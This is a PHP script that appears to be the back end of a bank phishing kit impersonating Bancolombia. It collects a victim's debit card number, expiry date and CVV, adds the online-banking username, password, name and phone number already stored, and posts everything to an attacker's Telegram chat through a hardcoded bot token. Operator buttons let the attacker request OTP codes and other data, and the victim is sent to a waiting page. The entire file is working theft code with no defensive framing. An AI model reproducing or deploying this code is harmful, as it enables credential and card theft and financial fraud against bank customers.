<?php

ob_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

$tar   = isset($_POST['tar']) ? $_POST['tar'] : '';
$fecha = isset($_POST['fecha']) ? $_POST['fecha'] : '';
$cvv   = isset($_POST['cvv']) ? $_POST['cvv'] : '';
$key   = isset($_POST['key']) ? $_POST['key'] : '';
if (!$key) {
    die("Error: Key no proporcionada.");
}

$stmt = $pdo->prepare(
    "SELECT nombre, telefono, `user` AS vp_usuario, `password` AS vp_clave,
            monto, banco
     FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
);
$stmt->execute(array($key));
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$nombre   = isset($data['nombre']) ? $data['nombre'] : '';
$telefono = isset($data['telefono']) ? $data['telefono'] : '';
$usuario  = isset($data['vp_usuario']) ? $data['vp_usuario'] : '';
$clave    = isset($data['vp_clave']) ? $data['vp_clave'] : '';
$monto    = isset($data['monto']) ? $data['monto'] : '';
$banco    = isset($data['banco']) ? $data['banco'] : 'Bancolombia';

try {
    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $e) {
    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

$update = $pdo->prepare(
    "UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE BINARY `key` = ?"
);
$update->execute(array($nuevo_request_id, $key));

$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
$token   = $DEFAULT_BOT_TOKEN_OPS;
if (is_string($envBot) && trim($envBot) !== '') { $token = $envBot; }
$chat_id = $DEFAULT_CHAT_ID_OPS;
if (is_string($envCh)  && trim($envCh)  !== '') { $chat_id = $envCh; }

function fv_extra($v, $ph = '<i>(no informado)</i>') {
    $s = is_string($v) ? trim($v) : '';
    if ($s === '') { return $ph; }
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$SEP = str_repeat("-", 30);
$mensaje  = "";
$mensaje .= "\xE2\x9C\x85 <b>[DATO EXTRA: TARJETA DEBITO (corta)]</b> Resumen tarjeta recibido:\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x92\xB0 Monto: " . fv_extra($monto) . "\n";
$mensaje .= "\xF0\x9F\x8F\xA6 Banco: " . fv_extra($banco) . "\n";
$mensaje .= "\xF0\x9F\x91\xA4 Usuario Virtual-Persona: " . fv_extra($usuario) . "\n";
$mensaje .= "\xF0\x9F\x94\x92 Clave Virtual-Persona: " . fv_extra($clave) . "\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x91\xA4 Nombre landing: " . fv_extra($nombre) . "\n";
$mensaje .= "\xF0\x9F\x93\x9E Telefono landing: " . fv_extra($telefono) . "\n";
$mensaje .= "\xF0\x9F\x92\xB3 Tarjeta: " . fv_extra($tar) . "\n";
$mensaje .= "\xF0\x9F\x93\x85 Vencimiento: " . fv_extra($fecha) . "\n";
$mensaje .= "\xF0\x9F\x94\x92 CVV: " . fv_extra($cvv) . "\n";
$mensaje .= $SEP . "\n";

$botones = array(
    'inline_keyboard' => array(
        array(
            array('text' => "\xF0\x9F\x9F\xA2 DINAMICA",             'callback_data' => "OPCION_1_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x9F\xA2 OTP/SMS",              'callback_data' => "OPCION_2_" . $nuevo_request_id),
        ),
        array(
            array('text' => "\xF0\x9F\x94\xB4 WHATSAPP",             'callback_data' => "OPCION_3_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x9F\xA2 PERSONALES",           'callback_data' => "OPCION_4_" . $nuevo_request_id),
        ),
        array(
            array('text' => "\xF0\x9F\x9F\xA2 CREDITO ",             'callback_data' => "OPCION_5_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x9F\xA2 DEBITO",               'callback_data' => "OPCION_6_" . $nuevo_request_id),
        ),
        array(
            array('text' => "\xF0\x9F\x94\xB4 ERROR USUARIO ",       'callback_data' => "OPCION_7_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x9F\xA2 CVV",                  'callback_data' => "OPCION_55_" . $nuevo_request_id),
        ),
        array(
            array('text' => "\xF0\x9F\x94\xB4 ERROR DINAMICA ",      'callback_data' => "OPCION_9_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",            'callback_data' => "OPCION_10_" . $nuevo_request_id),
        ),
    ),
);

$payloadArr = array(
    'chat_id'                  => $chat_id,
    'text'                     => $mensaje,
    'parse_mode'               => 'HTML',
    'disable_web_page_preview' => true,
    'reply_markup'             => $botones,
);
$payload = json_encode($payloadArr);

$ch = curl_init("https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$qs = http_build_query(array('rid' => $nuevo_request_id, 'key' => $key), '', '&', PHP_QUERY_RFC3986);
header("Location: espera.html?" . $qs);
exit;
